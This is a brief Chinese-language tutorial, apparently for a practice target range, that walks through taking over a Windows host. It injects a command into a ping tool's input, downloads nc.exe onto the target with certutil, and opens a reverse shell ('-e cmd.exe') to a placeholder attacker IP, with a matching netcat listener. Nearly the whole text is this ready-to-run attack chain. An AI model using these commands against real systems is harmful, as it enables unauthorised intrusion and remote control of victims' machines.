## 获取目标权限

通过指令注入来获取权限，以一个简单的ping工具靶场为例，使用如下输入获取权限

    192.168.10.11 & config

>后续均使用ip地址 + 的组合来拼接指令，省略了重复部分

## 将nc工具下载至目标

使用 [棱角社区工具](https://forum.ywhack.com/bountytips.php?download) 中的**文件下载**来生成对应系统的文件下载命令并使用，例如

    certutil.exe -urlcache -split -f http://127.0.0.1:8080/nc.exe n.exe

##  反向连接

用nc工具进行shell反弹，让目标反向连接至主机，从而获得操作权限

    n.exe <攻击者IP> <监听端口> -e cmd.exe

- `<攻击者IP>`是攻击者主机 IP，需提前使用`nc -lvnp 端口`监听
- `-e cmd.exe`表示连接成功后，将命令行绑定到连接中，实现交互式 Shell
